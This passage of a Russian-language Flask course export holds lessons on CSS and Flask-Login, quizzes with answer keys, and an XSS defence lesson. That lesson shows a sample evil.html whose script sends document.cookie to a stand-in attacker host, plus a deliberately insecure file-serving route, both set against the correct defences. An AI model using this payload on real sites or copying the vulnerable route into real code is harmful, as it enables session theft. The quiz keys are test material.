style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">Flask</span><span style=\"color:black;mso-themecolor:text1;\">, является статическим ресурсом (также как, например, файлы изображений) и поэтому должен (обязательно) располагаться в папке '</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">static</span><span style=\"color:black;mso-themecolor:text1;\">' в папке приложения.</span></p><p><span style=\"color:black;mso-themecolor:text1;\">В </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">VS</span><span style=\"color:black;mso-themecolor:text1;\" lang=\"EN-US\"> </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">Code</span><span style=\"color:black;mso-themecolor:text1;\"> откройте папку '</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">static</span><span style=\"color:black;mso-themecolor:text1;\">' и создайте там файл '</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">style</span><span style=\"color:black;mso-themecolor:text1;\">.</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">css</span><span style=\"color:black;mso-themecolor:text1;\">' .</span></p><p><span style=\"color:black;mso-themecolor:text1;\">В базовом шаблоне сайта подключите </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">css</span><span style=\"color:black;mso-themecolor:text1;\">-файл следующим образом:</span></p><p><span style=\"color:black;mso-themecolor:text1;\">В файле </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">base</span><span style=\"color:black;mso-themecolor:text1;\">.</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"color:black;mso-themecolor:text1;\">, в конце разделе &lt;</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">head</span><span style=\"color:black;mso-themecolor:text1;\">&gt; напишите следующий код:</span></p><p class=\"a\"><code><span style=\"color:black;line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;mso-themecolor:text1;\" lang=\"EN-US\">&lt;link rel=\"stylesheet\" href=\"{{ url_for('static', filename='style.css') }}\"&gt;</span></code><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span></p><p><span style=\"color:black;mso-themecolor:text1;\">В </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">css</span><span style=\"color:black;mso-themecolor:text1;\">-файле напишите что ни будь простое, чтобы проверить работу </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">CSS</span><span style=\"color:black;mso-themecolor:text1;\">, например, измените цвет фона страницы:</span></p><p><code>body {<span style=\"color:black;mso-themecolor:text1;\"></span></code></p><p><code>&nbsp; background-color: red;<span style=\"color:black;mso-themecolor:text1;\"></span></code></p><p><code>}</code><span style=\"color:black;mso-themecolor:text1;\"></span></p><p><span style=\"color:black;mso-themecolor:text1;\">Обновите страницу и убедитесь, что </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">CSS</span><span style=\"color:black;mso-themecolor:text1;\"> подключился.</span></p><p><span style=\"color:black;mso-themecolor:text1;\"></span></p><p>&nbsp;</p><p><span style=\"color:black;mso-themecolor:text1;\">Задание.</span></p><p><span style=\"color:black;mso-themecolor:text1;\">С помощью </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">CSS</span><span style=\"color:black;mso-themecolor:text1;\"> уберите в пунктах меню маркеры, а в текстах ссылок нижние подчёркивания.</span></p><p><span style=\"color:black;mso-themecolor:text1;\">Пояснение:</span></p><p><span style=\"color:black;mso-themecolor:text1;\">Задачей данного курса является изучение фреймворка </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">Flask</span><span style=\"color:black;mso-themecolor:text1;\">, а не языка стилей </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">CSS</span><span style=\"color:black;mso-themecolor:text1;\">. Если вы не владеете </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">CSS</span><span style=\"color:black;mso-themecolor:text1;\"> в достаточной степени, чтобы выполнять задания связанные с визуальной стилизацией, вы можете пользоваться кодогенерацией с помощью инструментов ИИ.</span></p><p><span style=\"color:black;mso-themecolor:text1;\">Например, можно сделать так: открыть страницу в браузере -&gt; нажать </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">F</span><span style=\"color:black;mso-themecolor:text1;\">12 и перейти в инструменты разработчика -&gt; перейти на вкладку '</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">elements</span><span style=\"color:black;mso-themecolor:text1;\">' -&gt; на элементе </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">body</span><span style=\"color:black;mso-themecolor:text1;\" lang=\"EN-US\"> </span><span style=\"color:black;mso-themecolor:text1;\">нажать правую кнопку мыши -&gt; </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">copy</span><span style=\"color:black;mso-themecolor:text1;\"> -&gt; </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">Copy</span><span style=\"color:black;mso-themecolor:text1;\" lang=\"EN-US\"> </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">element</span><span style=\"color:black;mso-themecolor:text1;\">. Скопированный </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"color:black;mso-themecolor:text1;\">-код вставьте в ИИ и попросите сгенерировать подходящий </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">CSS</span><span style=\"color:black;mso-themecolor:text1;\">, либо тот </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">CSS</span><span style=\"color:black;mso-themecolor:text1;\">, который требуется по заданию.</span></p><p><span style=\"color:black;mso-themecolor:text1;\"></span></p><p><span style=\"color:black;mso-themecolor:text1;\"></span></p>"
            },
            "is_published": true
        },
        {
            "id": 18,
            "section_id": 4,
            "number": 1,
            "name": "Flask-Login. Начало",
            "slug": "flask-login-start",
            "content": {
                "tasks": [],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Flask-SQLAlchemy ",
                            "Python-dotenv ",
                            "Tailwind CSS ",
                            "Werkzeug "
                        ],
                        "question": "Какой пакет используется для безопасного хэширования паролей в рамках курса?",
                        "correct_index": 3
                    },
                    {
                        "id": 2,
                        "options": [
                            "Чтобы упростить написание HTML-шаблонов и сократить количество файлов в проекте",
                            "Чтобы отказаться от использования виртуальных окружений Python при разработке",
                            "Чтобы повысить скорость работы базы данных SQLite за счёт повторного использования соединений",
                            "Чтобы иметь возможность создавать несколько экземпляров Flask-приложения в разных средах выполнения "
                        ],
                        "question": "Зачем в проекте используется паттерн «Фабрика приложений»?",
                        "correct_index": 3
                    },
                    {
                        "id": 3,
                        "options": [
                            "Позволяют логически разделять маршруты, шаблоны и бизнес-логику приложения на независимые модули ",
                            "Автоматически создают таблицы базы данных на основе структуры каталогов проекта",
                            "Обеспечивают безопасное хранение пользовательских паролей и данных сессий",
                            "Загружают и обрабатывают переменные окружения из файла .env при запуске приложения"
                        ],
                        "question": "Какую роль выполняют Blueprints (блупринты) во Flask-приложении?",
                        "correct_index": 0
                    },
                    {
                        "id": 4,
                        "options": [
                            "В файле project/main.py внутри функций маршрутов, где происходит работа с данными",
                            "В файле .env, откуда Flask загружает параметры подключения к базе данных",
                            "В файле project/init.py вне функции create_app, чтобы объект базы данных был доступен всем модулям",
                            "В любом HTML-шаблоне, который использует данные из базы через контекст шаблона"
                        ],
                        "question": "В каком файле проекта инициализируется объект SQLAlchemy, общий для всего приложения?",
                        "correct_index": 2
                    },
                    {
                        "id": 5,
                        "options": [
                            "Обращение к глобальному пространству имён Python для поиска стандартных модулей",
                            "Подключение сторонней библиотеки Flask-SQLAlchemy из виртуального окружения",
                            "Импорт объекта db из текущего пакета приложения, определённого в файле init.py",
                            "Использование переменной окружения с именем db при инициализации приложения"
                        ],
                        "question": "Что означает точка перед import в выражении from . import db?",
                        "correct_index": 2
                    },
                    {
                        "id": 6,
                        "options": [
                            "Потому что Flask использует фабрику приложения, и обеспечивает более корректный и гибкий запуск сервера",
                            "Потому что метод app.run() полностью удалён из современных версий Flask",
                            "Потому что команда flask run автоматически создаёт таблицы базы данных при старте",
                            "Потому что app.run() несовместим с использованием Blueprint-модулей"
                        ],
                        "question": "Почему рекомендуется запускать приложение с помощью команды flask run, а не через app.run()?",
                        "correct_index": 0
                    },
                    {
                        "id": 7,
                        "options": [
                            "HTML-разметку страниц входа, регистрации и профиля пользователя",
                            "Переменные окружения и секретные настройки ",
                            "Описание моделей базы данных и связей между таблицами",
                            "Python-код маршрутов и логики Flask-приложения"
                        ],
                        "question": "Какую информацию содержит файл .env в данном проекте?",
                        "correct_index": 1
                    }
                ],
                "theory_html": "<h4>Введение</h4><p>Возможность безопасного входа — это критически важная часть современного web-приложения.</p><p>Мы будем использовать библиотеку Flask-Login для управления сеансами и современный синтаксис SQLAlchemy для работы с данными.</p><p>Мы создадим защищенные страницы, которые будут видны только авторизованным пользователям, и построим красивый интерфейс на Tailwind CSS.</p><p>&nbsp;</p><p>Основные темы курса:</p><p>- Использование Flask-Login для безопасного управления сессиями.</p><p>- Современное хэширование паролей штатными средствами Werkzeug.</p><p>- Защита маршрутов с помощью декораторов.</p><p>- Использование объектно-реляционного отображения (ORM) через Flask-SQLAlchemy.</p><p>- Создание современных форм регистрации и входа на Tailwind CSS.</p><p>- Обработка и вывод системных уведомлений (Flash-сообщения).</p><p>(Что такое SQLAlchemy и Tailwind CSS - в следующих лекциях)</p><p>&nbsp;</p><p>Предварительные требования.</p><p>Для работы вам понадобится:</p><p>Python версии 3.12 или выше.</p><p>Базовые навыки работы с терминалом (командной строкой).</p><p>Редактор кода (рекомендуется VS Code).</p><p>&nbsp;</p><p>Наше приложение будет использовать паттерн Фабрика приложений и Блупринты (Blueprints). Это архитектурный стандарт, который позволяет разделять логику авторизации и основную логику сайта.</p><p>&nbsp;</p><p>Схема структуры проекта.</p><p>Ниже представлен список каталогов и файлов приложения с кратким описанием:</p><p>flask_auth_app/</p><p>.env (хранение секретов и настроек)</p><p>project/init.py (настройка фабрики приложения)</p><p>project/auth.py (логика входа и регистрации)</p><p>project/main.py (основные страницы)</p><p>project/models.py (описание таблиц базы данных)</p><p>project/db.sqlite (сама база данных)</p><p>project/templates/base.html (главный шаблон с Tailwind CSS)</p><p>project/templates/index.html (главная страница)</p><p>project/templates/login.html (вход)</p><p>project/templates/signup.html (регистрация)</p><p>project/templates/profile.html (личный кабинет)</p><p>Такая структура каталогов и файлов проект является боле профессиональной, чем та, которую мы использовали в предыдущем приложении.</p><p>&nbsp;</p><h4>Установка пакетов</h4><p>Нам понадобятся четыре основных пакета:</p><p>Flask: основной фреймворк.</p><p>Flask-Login: для авторизации.</p><p>Flask-SQLAlchemy: для работы с БД.</p><p>python-dotenv: для безопасного хранения секретных ключей.</p><p>&nbsp;</p><p>Шаги по установке:</p><p>1. Создайте папку <code>flask_auth_app</code> и перейдите в нее.</p><p>&nbsp;</p><p>2. Создайте виртуальное окружение:</p><p><code>python -m venv venv</code></p><p>&nbsp;</p><p>3. Активируйте его:</p><p><code>venv\\Scripts\\activate</code></p><p>&nbsp;</p><p>4. Установите библиотеки:</p><p><code>pip install flask flask-sqlalchemy flask-login python-dotenv</code></p><p>(обратите внимание: мы можем инсталлировать несколько пакетов сразу)</p><p>&nbsp;</p><p>5. Создайте папку project.</p><p>В ней будет само приложение, то что потом будет отправлено на \"боевой\" сервер для развёртывания (хостинга).</p><p>&nbsp;</p><h4>Создание начальной версии приложения</h4><p>&nbsp;</p><p>1. Файл инициализации.</p><p>Обычно, в каждом web-приложении есть общий файл, где находятся общие настройки приложения, глобальные константы, инициализация необходимых для всего проекта функций, создание и начальная настройка базы данных.</p><p>В папке project создайте файл __init__.py (обязательно с двумя нижними подчёркиваниями перед и после имени файла), со следующим кодом:</p><pre><code class=\"language-python\">from flask import Flask\r\nfrom flask_sqlalchemy import SQLAlchemy\r\nimport os\r\n \r\n#Инициализируем объект базы данных вне функции, чтобы он был доступен во всем проекте\r\ndb = SQLAlchemy()\r\n \r\n# Функция для создания и настройки экземпляра Flask-приложения\r\ndef create_app():\r\n  app = Flask(__name__)\r\n \r\n  # Используем переменную окружения для SECRET_KEY.\r\n  # Если она не задана, используем заглушку (только на время разработки)\r\n  app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or 'dev-key-12345'\r\n \r\n  # Указываем путь к базе данных SQLite\r\n  app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'\r\n \r\n  # Отключаем отслеживание изменений для экономии ресурсов\r\n  app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\r\n \r\n  # Привязываем базу данных к нашему приложению\r\n  db.init_app(app)\r\n \r\n  # Регистрация Блупринтов (модулей приложения)\r\n  # Это позволяет разделить маршруты авторизации и общие страницы\r\n \r\n  from .main import main as main_blueprint\r\n \r\n  app.register_blueprint(main_blueprint)\r\n \r\n  return app</code></pre><p>Объяснение кода:</p><p>Функция <code>create_app</code> реализует паттерн Фабрика.</p><p>Это позволяет создавать несколько экземпляров приложения (например, для тестов).</p><p><code>os.environ.get('SECRET_KEY')</code></p><p>- извлекает ключ безопасности из системы, что защищает ваше приложение от взлома при краже исходного кода.</p><p><code>db.init_app(app)</code></p><p>- подготавливает SQLAlchemy к работе с конкретным экземпляром Flask.</p><p>&nbsp;</p><p>2. Создание главного файла приложения. (основная логика)</p><p>Файл <code>project/main.py</code></p><pre><code class=\"language-python\">from flask import Blueprint, render_template\r\nfrom . import db\r\n \r\nmain = Blueprint('main', __name__)\r\n \r\n@main.route('/')\r\ndef index():\r\n &nbsp;&nbsp; return 'Главная страница'\r\n \r\n@main.route('/profile')\r\ndef profile():\r\n &nbsp;&nbsp; return 'Страница профиля'</code></pre><p>Объяснение:</p><p>Блупринт — это способ группировки маршрутов.</p><p>Вместо одного огромного файла мы разбиваем проект на логические части: main для контента и auth для входа. (auth.py создадим позже)</p><p>В более сложных и функциональных приложениях таких отдельных файлов (блупринтов, модулей) может быть много.</p><p><code>from . import db</code></p><p>Точка перед import означает, что мы берем объект db (базу данных) из текущего пакета (файла <code>__init__.py</code>). Это позволяет всем модулям приложения работать с одной и той же базой.</p><p><code>Blueprint('main', __name__)</code></p><p>Мы инициализируем объект Блупринта.</p><p>'main' — это имя блупринта, которое используется для генерации ссылок через url_for.</p><p>__name__ — это специальная переменная Python, которая содержит имя текущего модуля. Она необходима Flask, чтобы правильно определить корневую папку проекта для поиска шаблонов.</p><p><code>@main.route('/')</code></p><p>Декоратор, который регистрирует функцию index как обработчик для главного адреса сайта.</p><p><code>def index()</code></p><p><code>def profile()</code></p><p>Функции-контроллеры. Внутри них мы прописываем логику, а return отправляет результат (текст или HTML-шаблон) обратно в браузер пользователя.</p><p>&nbsp;</p><p>3. Файл с секретными данными .env</p><p>Крайне важно не хранить секретные ключи прямо в коде.</p><p>Мы будем использовать файл .env.</p><p>В корне проекта (папка flask_auth_app, не внутри папки project) создайте файл с названием .env и напишите там:</p><p>FLASK_APP=project:create_app</p><p>FLASK_DEBUG=1</p><p>SECRET_KEY=секретный_ключ</p><p>&nbsp;</p><p>4. Запуск приложения.</p><p>Запустим приложение более профессиональным и универсальным способом, чем мы делали это до этого.</p><p>(раньше было</p><p><code>if __name__ == '__main__':</code></p><p><code>&nbsp;&nbsp; app.run(debug=True)</code></p><p>в файле app.py, и мы запускали сам этот файл на выполнение в интерпретаторе Python.</p><p>&nbsp;</p><p>Теперь для запуска вам достаточно просто написать в терминале:</p><p><code>flask run</code></p><p>Фласк сам найдет файл .env, загрузит настройки и запустит сервер на <code>http://127.0.0.1:5000</code>.</p><p>Вы сможете перейти по адресам /login или /profile и увидеть соответствующие надписи.</p><p>&nbsp;</p><p>Такой способ запуска более предпочтителен в реальных продакшн приложениях по следующим причинам:<br>Команда flask run — это встроенный инструмент командной строки Flask. Когда вы вводите её в терминале, Flask ищет файл, указанный в переменной окружения FLASK_APP, и запускает сервер.</p><p>Особенности:</p><p>Отделение кода от запуска:</p><p>Ваш основной код приложения не содержит лишних инструкций по запуску сервера. Это делает код «чище» и упрощает его использование в промышленной эксплуатации (например, на серверах Gunicorn или Nginx).</p><p>Перезагрузка:</p><p>Этот метод лучше справляется с автоматической перезагрузкой сервера при изменении кода.</p><p>Когда вы используете фабрику приложений create_app():</p><p>flask run находит вашу функцию create_app, вызывает её, получает готовый объект приложения и запускает сервер. Это профессиональный подход.</p><p>Итог. Используйте flask run.&nbsp;</p><p>Это безопаснее, позволяет гибко управлять настройками через .env и соответствует архитектуре \"Фабрика приложений\", которую используют в реальных проектах.</p><p>&nbsp;</p><p><strong>Другой способ использования blueprint во Flask</strong></p><p>Фреймворк&nbsp;Flask&nbsp;позволяет разделять большой, сложный проект на набор независимых модулей. Например, на сайте могут быть модули авторизации, админ-панели, подсчета числа просмотров страниц и так далее. Причем, каждый модуль может иметь свои шаблоны, стили оформления, наборы изображений. Все это хранится в отдельном подкаталоге, что делает фрагмент приложения совершенно независимым. И при необходимости, этот каталог можно просто скопировать в другой проект и подключить к другому сайту. Такие модули в терминологии Flask называются Blueprint (эскиз)</p><figure class=\"image image_resized\" style=\"width:38.01%;\"><img style=\"aspect-ratio:551/225;\" src=\"https://gvylosdtlepiikialkhn.supabase.co/storage/v1/object/public/lesson-images/afb9b8b1-bb60-4bb8-82af-bf03ff5010cf.png\" width=\"551\" height=\"225\"></figure><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 12,
            "section_id": 1,
            "number": 9,
            "name": "XSS - атаки и защита от них",
            "slug": "xss",
            "content": {
                "tasks": [],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Выполнение вредоносного кода в момент загрузки файла на сервер",
                            "Выполнение пользовательского JavaScript-кода браузером при просмотре или отдаче файла с сайта ",
                            "Переполнение памяти сервера при загрузке больших файлов",
                            "Подмена имени загружаемого файла"
                        ],
                        "question": "Что такое XSS-атака в контексте загрузки и отдачи файлов во Flask?",
                        "correct_index": 1
                    },
                    {
                        "id": 2,
                        "options": [
                            "В момент загрузки файла на сервер",
                            "В момент сохранения файла на диск",
                            "В момент проверки расширения файла",
                            "В момент просмотра или отдачи файла браузеру пользователя "
                        ],
                        "question": "В какой момент возникает XSS-уязвимость при работе с пользовательскими файлами?",
                        "correct_index": 3
                    },
                    {
                        "id": 3,
                        "options": [
                            "Потому что .html нельзя полностью заблокировать во Flask",
                            "Потому что браузеры игнорируют расширения файлов",
                            "Потому что другие форматы (SVG, PDF, TXT) могут содержать и выполнять JavaScript ",
                            "Потому что MIME-типы всегда задаются сервером"
                        ],
                        "question": "Почему запрет расширения .html не обеспечивает полноценную защиту от XSS?",
                        "correct_index": 2
                    },
                    {
                        "id": 4,
                        "options": [
                            "Content-Type: application/as_attachment",
                            "X-Content-Type-Options: attachment=True",
                            "Content-Disposition: attachment ",
                            "Cache-Control: as_attachment"
                        ],
                        "question": "Какой HTTP-заголовок добавляется при использовании as_attachment=True?",
                        "correct_index": 2
                    },
                    {
                        "id": 5,
                        "options": [
                            "Чтобы ускорить доступ к файлам",
                            "Чтобы Flask автоматически шифровал файлы",
                            "Чтобы файлы нельзя было открыть напрямую по URL ",
                            "Чтобы браузер не мог их скачать"
                        ],
                        "question": "Почему рекомендуется хранить загруженные файлы вне web-root (корневого каталога сайта)?",
                        "correct_index": 2
                    }
                ],
                "theory_html": "<p>XSS (Cross-Site Scripting - межсайтовый скриптинг) - это подтип атаки на web-системы, заключающийся во внедрении в выдаваемую web-системой страницу вредоносного кода (который будет выполнен на компьютере пользователя при открытии им этой страницы) и взаимодействии этого кода с веб-сервером злоумышленника.</p><p>&nbsp;</p><p>Разберём XSS-сценарий именно в контексте загрузки и отдачи файлов.</p><p>&nbsp;</p><p>1. Что такое XSS в этом контексте.</p><p>XSS (Cross-Site Scripting) возникает, когда:</p><p>браузер выполняет код, предоставленный пользователем, в контексте вашего сайта.</p><p>В случае загрузки файлов XSS возникает не при загрузке, а при просмотре / отдаче файла.</p><p>&nbsp;</p><p>2. Опасный сценарий (НЕПРАВИЛЬНАЯ реализация)</p><p>Шаг 1. Злоумышленник загружает файл.</p><p>Файл называется:</p><p><code>evil.html</code></p><p>Содержимое:</p><pre><code class=\"language-html\">&lt;!doctype html&gt;\r\n&lt;script&gt;\r\n  fetch(\"https://attacker.site/steal?cookie=\" + document.cookie)\r\n&lt;/script&gt;</code></pre><p>&nbsp;</p><p>Шаг 2. Сервер отдаёт файл «как страницу».</p><p>ПЛОХОЙ код:</p><pre><code class=\"language-python\">@app.route(\"/uploads/&lt;name&gt;\")\r\ndef show_file(name):\r\n &nbsp;&nbsp; return send_from_directory(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"uploads\",\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name,\r\n   &nbsp;&nbsp;&nbsp;&nbsp; as_attachment=False\r\n &nbsp;&nbsp; )</code></pre><p>или ещё хуже:</p><p><code>return open(path).read()</code></p><p>&nbsp;</p><p>Шаг 3. Пользователь открывает файл по URL:</p><p><code>https://your-site.com/uploads/evil.html</code></p><p>Браузер:</p><p>- видит Content-Type: text/html;</p><p>- выполняет JavaScript;</p><p>- вредоносный код работает в домене вашего сайта.</p><p>&nbsp;</p><p>3. Что именно украдёт злоумышленник ?</p><p>JavaScript может:</p><p>- украсть cookies (document.cookie)</p><p>- выполнить действия от имени пользователя</p><p>- отправлять AJAX-запросы</p><p>- подменять DOM</p><p>- атаковать других пользователей</p><p>Это stored XSS — самый опасный тип XSS.</p><p>&nbsp;</p><p>4. Почему расширение файла НЕ решает проблему</p><p>Ошибочное мышление:</p><p>«Запретим .html — и всё будет безопасно»</p><p>Почему это не работает:</p><p>- SVG (image/svg+xml) может содержать JS</p><p>- PDF может содержать JS</p><p>- браузер может угадать тип по содержимому</p><p>- evil.txt с HTML может быть выполнен при неправильных заголовках</p><p>&nbsp;</p><p>5. Как правильно защищаться (НАСТОЯЩАЯ защита)</p><p>5.1. as_attachment=True — ключевая защита</p><pre><code class=\"language-python\">return send_from_directory(\r\n &nbsp;&nbsp; folder,\r\n &nbsp;&nbsp; filename,\r\n &nbsp;&nbsp; as_attachment=True\r\n)</code></pre><p>Это добавляет заголовок:</p><p>Content-Disposition: attachment</p><p>браузер скачивает файл, а не выполняет его.</p><p>attachment - вложение, прикрепление, присоединение</p><p>&nbsp;</p><p>5.2. Хранение файлов вне web-root</p><p><code>instance/uploads/</code></p><p>файл нельзя открыть напрямую по URL</p><p>доступ только через Flask</p><p>&nbsp;</p><p>5.3. Никогда не встраивать пользовательские файлы в HTML</p><p>Опасно:</p><p><code>&lt;iframe src=\"/download/evil.html\"&gt;&lt;/iframe&gt;</code></p><p>Очень опасно:</p><p><code>&lt;div&gt;{{ file_content|safe }}&lt;/div&gt;</code></p><p>&nbsp;</p><p>5.4. Никогда не рендерить содержимое файлов как HTML</p><p>Запрещено:</p><p><code>return render_template_string(file.read())</code></p><p>&nbsp;</p><p>6. ПРАВИЛЬНЫЙ сценарий.</p><p>Злоумышленник загружает evil.html</p><p><span style=\"font-family:&quot;MS Gothic&quot;;\">-</span> файл сохраняется</p><p><span style=\"font-family:&quot;MS Gothic&quot;;\">-</span> имя заменяется на UUID</p><p><span style=\"font-family:&quot;MS Gothic&quot;;\">-</span> хранится вне приложения</p><p>Пользователь пытается открыть</p><p><code>/download/abc123.html</code></p><p>Flask отправляет:</p><p>Content-Disposition: attachment</p><p>- браузер скачивает файл</p><p>- JavaScript не выполняется</p><p>&nbsp;</p><p>7. Итог.</p><p>XSS при загрузке файлов возникает не в момент загрузки, а при неправильной отдаче загруженного файла. Если сервер возвращает пользовательский файл как HTML-страницу, браузер выполнит встроенный JavaScript в контексте сайта. Защита заключается не только в проверке расширений, а прежде всего в корректных HTTP-заголовках и принудительной загрузке файлов как вложений.</p><p>&nbsp;</p><p>8. Короткий чек-лист защиты от XSS при загрузке файлов</p><p><span style=\"font-family:&quot;MS Gothic&quot;;\">✔</span> as_attachment=True</p><p><span style=\"font-family:&quot;MS Gothic&quot;;\">✔</span> файлы вне web-root</p><p><span style=\"font-family:&quot;MS Gothic&quot;;\">✔</span> не встраивать в HTML</p><p><span style=\"font-family:&quot;MS Gothic&quot;;\">✔</span> не рендерить как шаблоны</p><p><span style=\"font-family:&quot;MS Gothic&quot;;\">✔</span> не использовать |safe</p><p><span style=\"font-family:&quot;MS Gothic&quot;;\">✔</span> не доверять MIME от клиента</p>"
            },
            "is_published": true
        },
        {
            "id": 1,
            "section_id": 1,
            "number": 1,
            "name": "Начало. Первое приложение на Flask",
            "slug": "start",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p class=\"MsoNormal\">Удалите папку с проектом и проделайте всё заново самостоятельно.</p><p class=\"MsoNormal\">Создайте папку проекта и настройте виртуальное окружение для Flask. Установите Flask и убедитесь, что он корректно работает, выполнив команду для проверки версии.</p>"
                    },
                    {
                        "id": 2,
                        "content": "<p class=\"MsoNormal\">Создайте файл app.py и реализуйте минимальное Flask-приложение с одной главной страницей, которое выводит текст «Привет, Flask!». Запустите сервер и проверьте отображение текста в браузере.</p>"
                    },
                    {
                        "id": 3,
                        "content": "<p class=\"MsoNormal\">Добавьте ещё один маршрут /hello, который возвращает текст «Привет, студент!». Убедитесь, что при переходе на /hello отображается правильный текст, а главная страница остаётся доступной.</p>"
                    },
                    {
                        "id": 4,
                        "content": "<p class=\"MsoNormal\">Измените текст на главной странице на «Добро пожаловать на мой сайт» и проверьте, что сервер автоматически обновляет изменения при включённом debug=True.</p>"
                    },
                    {
                        "id": 5,
                        "content": "<p class=\"MsoNormal\">Создайте маршрут /about, который возвращает HTML-код с заголовком:</p><p>\"О сайте\"</p><p>и коротким абзацем:</p><p>\"Это мой первый проект на Flask\".</p><p>Проверьте корректность отображения HTML в браузере.</p>"
                    },
                    {
                        "id": 6,
                        "content": "<p class=\"MsoNormal\">Сделайте так, чтобы каждая страница имела ссылку на главную страницу для возврата. Проверьте переходы между всеми страницами приложения.</p>"
                    },
                    {
                        "id": 7,
                        "content": "<p class=\"MsoNormal\">Попробуйте создать маршрут /contact, который возвращает HTML-форму с полями «Имя» и «Сообщение». На данном этапе форма не должна обрабатывать данные, только отображаться в браузере.</p>"
                    },
                    {
                        "id": 8,
                        "content": "<p class=\"MsoNormal\">В <span style=\"mso-ansi-language:EN-US;\" lang=\"EN-US\">ChatGPT</span><span lang=\"EN-US\"> </span>самостоятельно почитайте на тему:</p><p class=\"MsoNormal\">- Django;</p><p class=\"MsoNormal\">- FastAPI;</p><p class=\"MsoNormal\">- другие Python web-фреймворки.</p><p class=\"MsoNormal\">Обратите внимание:</p><p class=\"MsoNormal\">на различия;</p><p class=\"MsoNormal\">на сложность;</p><p class=\"MsoNormal\">на области применения;</p><p class=\"MsoNormal\">что выбирать на практике для той или иной задачи/проекта.</p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Он предназначен только для небольших сайтов",
                            "Он включает минимальный набор функций, а остальное подключается через расширения ",
                            "Он работает быстрее других фреймворков",
                            "Он поддерживает только один файл приложения"
                        ],
                        "question": "Что означает, что Flask является микрофреймворком?",
                        "correct_index": 1
                    },
                    {
                        "id": 2,
                        "options": [
                            "Для обработки HTTP-запросов",
                            "Для взаимодействия с базами данных",
                            "Для запуска сервера разработки",
                            "Для динамического формирования HTML-страниц"
                        ],
                        "question": "Для чего во Flask используется шаблонизатор Jinja2 ?",
                        "correct_index": 3
                    },
                    {
                        "id": 3,
                        "options": [
                            "Веб-сервер для Python-приложений",
                            "Интерпретатор Python для серверов",
                            "Библиотека Flask для маршрутизации",
                            "Стандарт взаимодействия между веб-сервером и Python-приложением"
                        ],
                        "question": "Что такое WSGI?",
                        "correct_index": 3
                    },
                    {
                        "id": 4,
                        "options": [
                            "Запускает веб-сервер",
                            "Формирует и возвращает HTTP-ответ",
                            "Подключает расширения",
                            "Управляет базой данных"
                        ],
                        "question": "Какую роль выполняет функция, связанная с маршрутом Flask?",
                        "correct_index": 1
                    },
                    {
                        "id": 5,
                        "options": [
                            "Для ускорения работы приложения",
                            "Для изоляции зависимостей проекта ",
                            "Для автоматического обновления Flask",
                            "Для подключения шаблонов Jinja"
                        ],
                        "question": "Зачем в Flask-проекте используется виртуальное окружение?",
                        "correct_index": 1
                    },
                    {
                        "id": 6,
                        "options": [
                            "Запускает Flask-приложение",
                            "Подключает шаблонизатор",
                            "Связывает URL-адрес с функцией-обработчиком ",
                            "Настраивает режим отладки"
                        ],
                        "question": "Что делает декоратор @app.route(\"/\") ?",
                        "correct_index": 2
                    },
                    {
                        "id": 7,
                        "options": [
                            "Приложение становится быстрее",
                            "Flask автоматически перезапускается при изменении кода ",
                            "Flask переходит в боевой режим",
                            "Отключается обработка ошибок"
                        ],
                        "question": "Что происходит при включённом параметре debug=True?",
                        "correct_index": 1
                    },
                    {
                        "id": 8,
                        "options": [
